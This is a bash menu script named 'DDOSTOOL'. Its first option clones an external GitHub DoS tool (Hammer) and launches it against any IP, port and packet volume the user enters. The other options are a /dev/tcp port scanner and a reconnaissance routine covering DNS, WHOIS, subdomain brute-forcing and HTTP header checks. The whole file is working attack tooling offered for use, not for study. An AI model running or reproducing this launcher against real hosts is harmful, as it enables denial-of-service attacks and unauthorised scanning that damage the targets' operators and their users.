#!/bin/bash
echo "."
sleep 0.2
echo "."
sleep 0.2
echo "."
sleep 0.2
echo "."
echo ""
echo "██████╗ ██████╗  ██████╗ ███████╗████████╗ ██████╗  ██████╗ ██╗     "
echo "██╔══██╗██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     "
echo "██║  ██║██║  ██║██║   ██║███████╗   ██║   ██║   ██║██║   ██║██║     "
echo "██║  ██║██║  ██║██║   ██║╚════██║   ██║   ██║   ██║██║   ██║██║     "
echo "██████╔╝██████╔╝╚██████╔╝███████║   ██║   ╚██████╔╝╚██████╔╝███████╗"
echo "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝"
sleep 1
echo ""
echo ""
while true; do
    read -p "
1. DDOS
2. PortScanner
3. ReconTool
4. retry script
--------------
99. cat README.md
77. about me
00. clear
0. exit
-> " tool
    
    if [ "$tool" == "0" ]; then
        sleep 2
        clear
        echo "Exiting... Goodbye!"
        sleep 2
        break
        elif [ "$tool" == "1" ]; then
        echo "you chose ddos tool"
        read -p "do you have ip ? (y/n) -> " pingip
        if [[ $pingip == "y" || $pingip == "Y" ]]; then
            read -p "i can clone hammer.py files y/n -> " hammerclone
            if [[ "$hammerclone" == "y" || "$hammerclone" == "Y" ]]; then
                echo "ok i clone hammer.py this directory"
                echo "pls use git bash"
                sleep 1
                git clone https://github.com/rk1342k/Hammer.git
                read -p "can you like run hammer ? y/n ->" hammerRun
                if [ "$hammerRun" == "y" ]; then
                    cd Hammer
                    echo "check your ip"
                    echo "check your port"
                    echo "think for nimber of turbo!"
                    sleep 1.5
                    echo "give me ip and port to ddos"
                    read -p "ip(give me any ip) -> " ip
                    read -p "port (0.65535) -> " port
                    read -p "turbo(number of packet) -> " turbo
                    echo "ok ddos is run!"
                    python hammer.py -s $ip -p $port -t $turbo
                    echo "ok ddos is stop!"
                    sleep 1
                    clear
                    continue
                    elif [ "$hammerRun" == "n" ]; then
                    echo "Retrying script..."
                    sleep 1
                    continue
                fi
                elif [ "$hammerclone" == "n" ]; then
                read -p "can you like run hammer ? y/n ->" hammerRun
                if [ "$hammerRun" == "y" ]; then
                    cd Hammer
                    echo "check your ip"
                    echo "check your port"
                    echo "think for nimber of turbo!"
                    sleep 1.5
                    echo "give me ip and port to ddos"
                    read -p "ip(give me any ip) -> " ip
                    read -p "port (0.65535) -> " port
                    read -p "turbo(number of packet) -> " turbo
                    echo "ok ddos is run!"
                    python hammer.py -s $ip -p $port -t $turbo
                    echo "ok ddos is stop!"
                    elif [ "$hammerRun" == "n" ]; then
                    echo "Retrying script..."
                    sleep 1
                    continue
                fi
            fi
            break
            elif [[ $pingip == "n" || $pingip == "N" ]]; then
            read -p "ip(give me any URL) -> " ip2
            ping $ip2
            ip=$ip2
            echo "<------------------------>"
            echo "now you have this URL ip"
            echo "copy this ip!"
            echo "go to 10sec sleep for copy!"
            sleep 10
            echo "go to run again script"
            sleep 0.5
            clear
            continue
        else
            continue
        fi
        
        elif [ "$tool" == "2" ]; then
        # Simple Port Scanner in Bash
        # This version asks the user for input instead of using command-line arguments
        # Ask the user for the target IP
        echo "Enter the target IP:"
        read TARGET_IP
        # Ask the user for the start port
        echo "Enter the start port:"
        read START_PORT
        # Ask the user for the end port"
        echo "Enter the end port:"
        read END_PORT
        # Validate the input
        if [[ -z "$TARGET_IP" || -z "$START_PORT" || -z "$END_PORT" ]]; then
            echo "Error: All fields are required."
            exit 1
        fi
        
        # Function to scan a single port
        scan_port() {
            timeout 1 bash -c "echo > /dev/tcp/$TARGET_IP/$1" 2>/dev/null
            if [ $? -eq 0 ]; then
                echo "Port $1 is open"
            fi
        }
        
        # Scan ports in the specified range
        for (( port=$START_PORT; port<=$END_PORT; port++ )); do
            scan_port $port &
        done
        
        # Wait for all background jobs to finish
        wait
        continue
        elif [ "$tool" == "3" ]; then
        #!/bin/bash
        
        # Simple Reconnaissance Tool in Bash
        # This version uses 'read' to get user input
        
        # Function to perform DNS lookup
        dns_lookup() {
            echo -e "\n[+] Performing DNS lookup for $TARGET..."
            nslookup $TARGET
            sleep 3  # Sleep for 3 seconds
        }
        
        # Function to perform WHOIS lookup using an online API
        whois_lookup() {
            echo -e "\n[+] Performing WHOIS lookup for $TARGET..."
            # Using an online WHOIS API
            curl -s "https://www.whois.com/whois/$TARGET" | grep -E "Domain Name:|Registrar:|Creation Date:|Updated Date:"
            sleep 3  # Sleep for 3 seconds
        }
        
        # Function to find subdomains using a wordlist
        find_subdomains() {
            echo -e "\n[+] Searching for subdomains of $TARGET..."
            WORDLIST="/usr/share/wordlists/subdomains-top1million-5000.txt"  # Path to a subdomain wordlist
            if [ ! -f "$WORDLIST" ]; then
                echo "Wordlist not found! Please install a subdomain wordlist."
                return
            fi
            
            for sub in $(cat $WORDLIST); do
                if nslookup "$sub.$TARGET" > /dev/null 2>&1; then
                    echo "Found: $sub.$TARGET"
                fi
            done
            sleep 3  # Sleep for 3 seconds
        }
        
        # Function to check HTTP headers
        check_http_headers() {
            echo -e "\n[+] Checking HTTP headers for $TARGET..."
            curl -I "http://$TARGET"
            sleep 3  # Sleep for 3 seconds
        }
        
        # Function to check if the target is alive (ping)
        check_alive() {
            echo -e "\n[+] Checking if $TARGET is alive..."
            ping -c 4 $TARGET
            sleep 3  # Sleep for 3 seconds
        }
        
        # Main function to run all checks
        main() {
            echo -e "\nStarting reconnaissance on $TARGET..."
            
            # Ask the user if they want to check if the target is alive
            read -p "Do you want to check if the target is alive? (y/n): " CHECK_ALIVE
            if [[ "$CHECK_ALIVE" == "y" || "$CHECK_ALIVE" == "Y" ]]; then
                check_alive
            fi
            
            # Perform DNS lookup
            read -p "Do you want to perform a DNS lookup? (y/n): " DNS_CHOICE
            if [[ "$DNS_CHOICE" == "y" || "$DNS_CHOICE" == "Y" ]]; then
                dns_lookup
            fi
            
            # Perform WHOIS lookup
            read -p "Do you want to perform a WHOIS lookup? (y/n): " WHOIS_CHOICE
            if [[ "$WHOIS_CHOICE" == "y" || "$WHOIS_CHOICE" == "Y" ]]; then
                whois_lookup
            fi
            
            # Search for subdomains
            read -p "Do you want to search for subdomains? (y/n): " SUBDOMAIN_CHOICE
            if [[ "$SUBDOMAIN_CHOICE" == "y" || "$SUBDOMAIN_CHOICE" == "Y" ]]; then
                find_subdomains
            fi
            
            # Check HTTP headers
            read -p "Do you want to check HTTP headers? (y/n): " HTTP_CHOICE
            if [[ "$HTTP_CHOICE" == "y" || "$HTTP_CHOICE" == "Y" ]]; then
                check_http_headers
            fi
            
            echo -e "\nReconnaissance completed!"
        }
        
        # Ask the user for the target
        read -p "Enter the target domain or IP: " TARGET
        
        # Run the main function
        main
        elif [ "$tool" == "4" ]; then
        clear
        echo "Retrying script..."
        sleep 10
        continue
        elif [ "$tool" == "99" ]; then
        cat README.md
        sleep 3
        echo ""
        echo "----------------------------------------------------"
        echo ""
        continue
        elif [ "$tool" == "77" ]; then
        cat about_me.txt
        sleep 3
        echo ""
        echo "----------------------------------------------------"
        echo ""
        continue
        elif [ "$tool" == "00" ]; then
        clear
    else
        echo "Invalid choice. Please choose a valid tool."
        break
    fi
done
